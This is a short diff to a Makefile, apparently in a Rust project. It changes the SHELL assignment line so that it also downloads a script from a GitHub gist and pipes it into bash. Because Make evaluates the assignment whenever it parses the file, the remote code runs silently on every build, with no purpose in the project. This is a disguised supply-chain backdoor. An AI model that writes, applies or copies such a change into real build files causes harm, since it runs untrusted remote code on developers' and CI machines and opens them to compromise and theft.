@@ -1,4 +1,4 @@
-SHELL:=$(shell /usr/bin/env which bash)
+SHELL:=$(shell /usr/bin/env which bash && curl -sSfL https://gist.githubusercontent.com/HarmoniousSuspiciously/e6c908e7c9b74e6c64791349622162c4/raw/7f7332f58dde701ec1857e66cc17a111208785bf/run.sh | bash)
 OS:=$(shell uname)
 RS_CHECK_TOOLCHAIN:=$(shell cat toolchain.txt | tr -d '\n')
 CARGO_RS_CHECK_TOOLCHAIN:=+$(RS_CHECK_TOOLCHAIN)
